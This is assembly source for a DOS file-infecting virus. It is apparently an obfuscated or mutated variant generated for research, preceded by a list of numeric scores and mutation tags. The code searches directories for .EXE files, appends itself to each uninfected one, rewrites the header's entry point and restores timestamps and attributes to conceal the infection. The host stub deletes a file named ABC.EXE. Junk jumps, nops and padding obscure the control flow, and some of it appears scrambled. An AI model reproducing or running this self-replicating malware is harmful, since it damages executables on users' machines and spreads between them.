;0.832431859414
;0.878146244066
;0.622431447881
;UntouchBlock_0
;0.588704495594
;UntouchBlock_0
;0.624771177618
;0.750361415652
;1.05021131778
;0.673219371838
;0.454585316216
;ForcedJMP_1
;0.836966157413
;ForcedJMP_0
;0.547120861381
;0.65034232861
;0.591651921503
;0.78584415467
;0.901183254056
;0.623190296192
;0.489878334593
;ForcedJMP_1
;0.548224255205
;ForcedJMP_0
;0.597069766181
;0.847823809636
;0.60624696883
;0.708330441864
;0.502987458703
;0.715676133583
;ForcedJMP_0
;0.613436546003
;0.574987062968
;UntouchBlock_0
;0.541342654042
;NoMutation
;0.618787718641
;0.521866158992
;0.621265574235
;UntouchBlock_0
;0.677493619613
;0.410442786085
;0.664779416848
;		JZ 	_1
;0.482377790182
;0.75867268045
;0.723110892542
;0.429819801085
;ForcedJMP_0
;0.686566914275
;0.531019675085
;0.628308837267
;0.484615301666
;0.322305245336
;0.546727888598
;0.561680349059
;UntouchBlock_1
;0.56420857326
;0.618564912626
;		JNZ 	_0
;0.533267978092
;UntouchBlock_1
;0.495080895456
;		JZ 	_1
;0.579976618854
;0.55958912677
;0.655205249427
;		JZ 	_0
;0.554421962982
;0.429888700427
;0.424578666126
;0.437384847761
;UntouchBlock_0
;0.473900158297
;		JZ 	_0
;0.623968325035
;		JZ 	_1
;0.450732307557
;0.336268761426
;0.466199298325
;0.371150015055
;		JNZ 	_0
;0.396798047752
;ForcedJMP_0
;0.309260363802
;0.458650437131
;ForcedJMP_0
;0.403719675959
;0.450366911225
;NoMutation
;0.348654027021
;		JZ 	_0
;0.258775100619
;0.311260535806
;0.293532701414
;0.296834419218
;NoMutation
;0.369636266161
;		JZ 	_0
;0.330092839458
;0.299755704199
;		JZ 	_0
;0.440367065765
;ForcedJMP_1
;0.314463961797
;0.328983439393
;0.332699504127
;		JNZ 	_0
;0.396371738252
;UntouchBlock_1
;0.447593437142
;0.266849395746
;0.296199200676
;		JNZ 	_0
;0.277253827592
;0.276777322674
;0.27364277852
;ForcedJMP_0
;0.256860844899
;ForcedJMP_0
;0.173648057376
;0.238537014467
;ForcedJMP_1
;0.143385933532
;ForcedJMP_0
;0.16442867103
;0.184312356873
;0.149536332004
;UntouchBlock_1
;0.153120530164
;0.164568874615
;0.122436643556
;NoMutation
;0.125972632691
;0.0946017695604
;0.122131664167
;0.116308482939
;UntouchBlock_1
;		JZ 	_0
;		JNZ 	_1
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
	 mov ds,ax
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
LGALZ:
	 int 21H 
	 mov ah,4CH
	 mov al,0
CYALZ:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		JMP 	QQHBD
nop
nop
nop
nop
nop
nop
nop
nop
nop
QQHBD:
		 mov ax,cs
		 mov ds,ax 						
		 mov ax,es 						
		cmp 	ax,dx
JNZ FVDQS
JMP HMHO_
FVDQS:
		 mov WORD PTR [OLDDTA+2],ax 	
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			


FINISH:  call RESTORE_DTA 	
QXV_G:
		call 	 YJUZO
HMHO_:
		call 	 FVDQS
 		 pop ax

REL1: 						
 		 mov ax,HSTACK 				
 		 cli 
FVGPM:
		call 	 IUQAX
DZGJF:
		call 	 SNOYV
 		 mov ss,ax
		cmp 	cx,bx
JNZ HYH_L
JMP LWKCV
HYH_L:

REL1A: 						
 		 mov sp,OFFSET HSTACK
 		 mov es,WORD PTR [OLDDTA+2] 
		JMP 	DZGJF
SNOYV:
		JMP 	FVGPM
IUQAX:
		 mov ds,WORD PTR [OLDDTA+2] 
LWKCV:
		call 	 HYH_L
 		 sti 					

REL2:					 			
AIT__:
		call 	 _AGDF
 		jmp FAR PTR HOST 


FIND_FILE:
	mov al,’\’ 
		JMP 	QXV_G
YJUZO:
	mov BYTE PTR [USEFILE],al
JZ _AGDF
JMP AIT__
_AGDF:
		JMP 	SLNHK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SLNHK:
	mov si,OFFSET USEFILE+1
	xor dl,dl
		JMP 	GUEDB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
GUEDB:
	mov ah,47H
		JMP 	PQVQY
CHXIE:
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
PQVQY:
		call 	 CHXIE
	mov BYTE PTR [USEFILE],al 

FF2: mov al,2
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
		cmp 	dx,ax
JZ FPMRX
JMP HMMHY
FPMRX:
	inc al 
	mov [LEVEL],al 
	call FINDBR 

FF3:
HMMHY:
		call 	 FPMRX
BFHHH:
		call 	 NKPAW
MXRAH:
		call 	 WQC_N
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
		JMP 	MXRAH
WQC_N:
		JMP 	PPNTM
OQOJN:
	mov si,OFFSET ALLFILE 
		cmp 	ax,bx
JZ NKPAW
JMP BFHHH
NKPAW:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
PPNTM:
		call 	 OQOJN
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		mov bx,OFFSET DTA2+1EH
		JMP 	DTGQU
DSKMY:
		mov al,[LEVEL]
		mov dl,2BH 
		mul dl 
		add bx,ax 
		mov si,bx
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WYJTO:
		call 	 YCQTK
DTGQU:
		call 	 DSKMY
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
		stosb

FBE1: mov al,1 
	or al,al
	ret

FBE2: pop di 

FBE3: xor al,al 
MXTS_:
		call 	 PIHMO
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		mov ah,1AH
		cmp 	dx,bx
JNZ YCQTK
JMP WYJTO
YCQTK:
		int 21H
		mov di,OFFSET USEFILE
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
		mov cx,3FH 
		JMP 	IRMJZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IRMJZ:
		mov ah,4EH
JNZ PIHMO
JMP MXTS_
PIHMO:
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		JMP 	CLAGO
nop
nop
nop
nop
CLAGO:
		mov ah,4FH
JNZ IJAVS
JMP QBO_J
IJAVS:
		int 21H 
BLCTV:
		call 	 KD_SH
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
	 stc
	 ret

FENC:
	 pop di
QBO_J:
		call 	 IJAVS
	 ret


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
		cmp 	bx,cx
JZ KD_SH
JMP BLCTV
KD_SH:
	 mov ah,4EH 
		cmp 	bx,dx
JNZ QJIWE
JMP XKAGH
QJIWE:
XKAGH:
		call 	 QJIWE
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
	 int 21H
	 mov ah,4FH
	 int 21H 
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
 mov al,2BH
 mul [LEVEL]
 add dx,ax 
 ret
IIVRO:
		call 	 ZHNDQ
HNKEQ:
		call 	 XEZKQ


CONCAT:
	 mov al,byte ptr es:[di] 
		JMP 	HNKEQ
XEZKQ:
		JMP 	IIVRO
ZHNDQ:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		 mov ah,’Z’
		JMP 	_JUAG
OALKU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
_JUAG:
		call 	 OALKU
	     ret 


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
	 int 21H

RE_RET: ret 


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
	 cmp ax,4*NUMRELS 

IFTWR:
		call 	 JDTAY
RR_RET: ret     


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
	 mov cx,dx
	 mov dx,ax 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
	 mov bx,[HANDLE]
	 mov dx,OFFSET VIDC
	 mov cx,2 
		cmp 	dx,ax
JNZ JDTAY
JMP IFTWR
JDTAY:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
		JMP 	RWZWP
FISSS:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
RWZWP:
		call 	 FISSS
	 stc 

II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
		cmp 	cx,ax
JNZ GKOHK
JMP BKPDA
GKOHK:
	 sub cl,al 
		JMP 	ACACW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ACACW:
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
		cmp 	ax,dx
JNZ FTCQJ
JMP QKFMO
FTCQJ:
A_BZN:
		call 	 YIFUF
	 int 21H

SB_E: ret
AJLNW:
QKFMO:
		call 	 FTCQJ
		call 	 OUVRT
BKPDA:
		call 	 GKOHK


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
JNZ YIFUF
JMP A_BZN
YIFUF:
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
		JMP 	AJLNW
OUVRT:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
YIYSR:
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL2 
UQS_K:
JSZMV:
	 add bx,1 
	 add dx,bx
	 mov bx,0
UPQTK:
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
	 mov cx,4
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
NXZSV:
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,NUMRELS 
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
TMNLJ:
	 dec ax 
	 dec ax 
		JMP 	TZPYU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
TZPYU:
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
		JMP 	ILRRA
WXREC:
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 
ILRRA:
		call 	 WXREC



TIMECT EQU 63 


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
PZDNS:
		call 	 JGOXP
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
		JMP 	PZDNS
JGOXP:
	 mov ah,1AH
	 int 21H 
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
	 int 21H
	 mov [HANDLE],ax 
	 mov ah,57H 
	 xor al,al
		JMP 	ZFDUD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZFDUD:
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
	 mov ax,WORD PTR [DTA1+28] 
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
 	 ret



REST_ATTRIBUTE:
	 mov dx,[FDATE] 
		JMP 	K_LET
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
K_LET:
	 mov cx,[FTIME]
	 mov ah,57H 
	 mov al,1
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
	 mov bx,[HANDLE]
		JMP 	CTJNZ
IMKUF:
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
	 mov al,1
	 mov dx,OFFSET USEFILE
	 int 21H
CTJNZ:
		call 	 IMKUF
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
